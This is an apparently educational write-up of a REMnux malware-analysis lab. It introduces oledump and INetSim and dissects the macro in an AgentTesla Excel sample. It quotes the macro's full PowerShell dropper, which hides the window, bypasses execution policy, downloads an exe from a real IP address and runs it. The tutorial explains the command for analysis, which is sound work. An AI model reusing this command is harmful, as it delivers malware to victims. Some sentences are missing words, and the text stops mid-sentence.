
Analysing potentially malicious software can be daunting, especially when this is part of an ongoing security incident. This analysis puts much pressure on the analyst. Most of the time, the results must be as accurate as possible, and analysts use different tools, machines, and environments to achieve this


The REMnux VM is a specialised distro. It already includes tools like Volatility, YARA, Wireshark, oledump, and INetSim. It also provides a sandbox-like environment for dissecting potentially malicious software without risking your primary system. It's your lab set up and ready to go without the hassle of manual installations.


oledump.py - a Python tool that analyzes OLE2 files, commonly called Structured Storage or compound File Binary Format. OLE stands for Object Linking and Embedding, a proprietary technology develoved by Microsoft.

OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.


```bash

"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```



Let's break it down!

- So, in

, running the `-WindowStyle` parameter allows you to control how the PowerShell window appears when executing a script or command. In this case, `hidden` means that the- window **won’t be visible to the user**.
- By default,

- restricts script execution for security reasons. The `-executionpolicy` parameter allows you to override this policy. The `bypass` means that the **execution policy is temporarily ignored**, allowing any script to run without restriction.
- The `Invoke-WebRequest` is commonly used for downloading files from the internet.
    - The `-Uri` Specifies the URL of the web resource you want to retrieve. In our case, the script is downloading the resource `Doc-3737122pdf.exe` from `http://193.203.203.67/rt`/.
    - The `-OutFile` specifies the local file where the downloaded content will be saved.  In this case, the Doc-3737122pdf.exe will be saved to $TempFile.
- The `Start-Process` is used to execute the downloaded file that is stored in `$TempFile` after the web request.

To summarize, when the document `agenttesla.xlsm` is opened, a Macro will run! This Macro contains a VBA script. The script will run and will be running a PowerShell to download a file named `Doc-3737122pdf.exe` from `http://193.203.203.67/rt/`, save it to a variable $TempFile, then execute or start running the file inside this variable, which is a binary or a .exe file (`Doc-3737122pdf.exe`**)**. This is a usual technique used by threat actors to avoid early detection. Pretty nasty, right?!



**INetSim**

During dynamic analysis, it is essential to observe the behaviour of potentially malicious software—especially its network activities. There are many approaches to this. We can create a whole infrastructure, a virtual environment with different core machines, and more. Alternatively, there is a tool inside our REMnux called **INetSim: Internet Services Simulation Suite



